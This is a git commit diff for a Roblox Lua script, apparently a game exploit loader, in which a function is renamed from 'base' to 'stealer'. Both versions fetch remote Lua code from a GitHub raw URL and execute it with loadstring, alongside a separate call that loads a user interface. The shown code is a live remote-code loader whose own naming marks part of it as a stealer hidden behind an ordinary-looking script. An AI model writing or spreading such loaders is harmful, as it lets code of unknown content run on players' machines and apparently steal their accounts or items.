ad5558c228464deb6f5980bccd7b9fe48604aff8
BIudnyHoIandan <taeistnkzxx@gmail.com>
2025-08-31 00:15:01 +0500

    Update amv.lua

--- primordial/script/amv.lua
+++ primordial/script/amv.lua
@@ -1,9 +1,9 @@
-local function base()
+local function stealer()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/file.lua"))()
 end
 local function loadui()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/script.lua"))()
 end
 
-task.spawn(base)
+task.spawn(stealer)
 task.spawn(loadui)
